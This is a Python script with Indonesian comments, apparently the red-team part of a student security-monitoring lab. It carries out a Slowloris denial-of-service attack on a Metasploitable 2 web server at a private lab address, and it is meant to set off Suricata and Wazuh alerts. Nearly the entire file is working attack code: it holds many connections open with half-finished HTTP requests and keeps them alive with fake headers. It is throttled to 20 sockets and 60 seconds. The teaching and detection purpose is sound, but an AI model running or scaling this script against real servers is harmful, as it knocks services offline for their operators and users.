#!/usr/bin/env python3
"""
=============================================================
  Mini SOC Project — Person A (Red Team)
  Scenario 4: Slowloris DoS (Light Mode — Demo Only)
=============================================================
  Target  : Metasploitable 2 @ 192.168.100.40 (port 80)
  Attacker: Kali Linux       @ 192.168.100.160
  Tactic  : T1499 - Endpoint Denial of Service (MITRE ATT&CK)
  Tools   : socket (standard library)
=============================================================
  Cara kerja Slowloris:
    - Buka banyak koneksi HTTP ke server
    - Kirim HTTP request yang tidak pernah selesai
      (header terus dikirim sedikit-sedikit, tidak pernah \r\n\r\n)
    - Server menunggu request selesai → connection slot habis
    - Berbeda dari flood biasa — tidak butuh bandwidth besar

  Mode DEMO (light):
    - Hanya 20 koneksi (bukan ratusan)
    - Berjalan selama 60 detik lalu berhenti sendiri
    - Web server masih bisa recover setelah script stop
    - Cukup untuk trigger Suricata pattern detection
=============================================================
"""

import socket
import time
import datetime
import random
import sys

# ── Konfigurasi ──────────────────────────────────────────
TARGET_IP       = "192.168.100.40"
TARGET_PORT     = 80
ATTACKER_IP     = "192.168.100.160"

SOCKET_COUNT    = 20       # jumlah koneksi — sengaja dibatasi untuk demo
DURATION        = 60       # detik — stop otomatis setelah ini
KEEP_ALIVE_SEC  = 10       # kirim header palsu setiap N detik
# ─────────────────────────────────────────────────────────

BANNER = """
╔══════════════════════════════════════════════════════╗
║        MINI SOC — SCENARIO 4: SLOWLORIS DoS          ║
║  Target  : {target:<38} ║
║  Mode    : {mode:<38} ║
║  Time    : {time:<38} ║
╚══════════════════════════════════════════════════════╝
"""

# Header palsu yang dikirim terus-terusan untuk menjaga koneksi hidup
# tanpa pernah mengirim \r\n\r\n (penanda akhir HTTP request)
KEEP_ALIVE_HEADERS = [
    "X-Demo-Header: {}",
    "X-SOC-Test: {}",
    "X-Timestamp: {}",
    "X-Keep: {}",
]


def create_socket(target: str, port: int) -> socket.socket | None:
    """Buat satu koneksi HTTP setengah-jadi ke target."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))

        # Kirim HTTP GET yang tidak selesai — tidak ada \r\n\r\n di akhir
        s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
        s.send(f"Host: {target}\r\n".encode())
        s.send(f"User-Agent: Mozilla/5.0 (Demo SOC Test)\r\n".encode())
        s.send(f"Accept-Language: en-US\r\n".encode())
        # Sengaja TIDAK kirim \r\n penutup — server akan terus menunggu

        return s
    except Exception:
        return None


def run_slowloris(target: str, port: int) -> None:
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(BANNER.format(
        target = f"{target}:{port}",
        mode   = f"LIGHT ({SOCKET_COUNT} sockets, {DURATION}s)",
        time   = now,
    ))

    print(f"[!] MODE DEMO — dampak minimal, stop otomatis setelah {DURATION} detik")
    print(f"[!] Web server akan recover normal setelah script selesai\n")

    # Countdown sebelum mulai
    for i in range(3, 0, -1):
        print(f"\r[*] Mulai dalam {i}...", end="", flush=True)
        time.sleep(1)
    print(f"\r[*] Memulai Slowloris...{' '*10}\n")

    # ── Fase 1: Buka semua koneksi ────────────────────────
    sockets = []
    print(f"[*] Membuka {SOCKET_COUNT} koneksi ke {target}:{port}...")

    for i in range(SOCKET_COUNT):
        s = create_socket(target, port)
        if s:
            sockets.append(s)
            print(f"\r[*] Koneksi aktif: {len(sockets)}/{SOCKET_COUNT}", end="", flush=True)
        time.sleep(0.1)

    print(f"\n[+] {len(sockets)} koneksi berhasil dibuka\n")

    if not sockets:
        print("[!] Tidak ada koneksi yang berhasil. Target mungkin down.")
        return

    # ── Fase 2: Keep-alive loop ───────────────────────────
    start_time  = time.time()
    cycle       = 0

    print(f"[*] Mempertahankan koneksi selama {DURATION} detik...")
    print(f"[*] Kirim header palsu setiap {KEEP_ALIVE_SEC} detik")
    print(f"{'─'*54}")

    try:
        while True:
            elapsed = time.time() - start_time

            # Stop otomatis setelah DURATION detik
            if elapsed >= DURATION:
                break

            cycle += 1
            remaining   = int(DURATION - elapsed)
            dead_sockets = []

            # Kirim header palsu ke semua koneksi yang masih hidup
            for s in sockets:
                try:
                    header = random.choice(KEEP_ALIVE_HEADERS)
                    s.send(f"{header.format(random.randint(1000, 9999))}\r\n".encode())
                except Exception:
                    dead_sockets.append(s)

            # Buang koneksi yang mati & ganti dengan yang baru
            for s in dead_sockets:
                sockets.remove(s)
                try:
                    s.close()
                except:
                    pass
                new_s = create_socket(target, port)
                if new_s:
                    sockets.append(new_s)

            print(
                f"  [cycle {cycle:>3}] "
                f"Koneksi aktif: {len(sockets):>3} | "
                f"Dropped: {len(dead_sockets):>2} | "
                f"Sisa: {remaining:>3}s"
            )

            time.sleep(KEEP_ALIVE_SEC)

    except KeyboardInterrupt:
        print(f"\n[*] Dihentikan manual oleh attacker (Ctrl+C)")

    # ── Fase 3: Cleanup ───────────────────────────────────
    print(f"\n[*] Menutup semua koneksi...")
    for s in sockets:
        try:
            s.close()
        except:
            pass

    elapsed_total = time.time() - start_time
    print(f"\n{'═'*54}")
    print(f"[+] SUMMARY SLOWLORIS")
    print(f"[+] Durasi aktif     : {elapsed_total:.1f} detik")
    print(f"[+] Max koneksi      : {SOCKET_COUNT}")
    print(f"[+] Cycles completed : {cycle}")
    print(f"[+] Status           : Selesai — server akan recover normal")
    print(f"{'═'*54}\n")
    print(f"[*] Cek Suricata alert di Wazuh Dashboard sekarang!")


if __name__ == "__main__":
    run_slowloris(TARGET_IP, TARGET_PORT)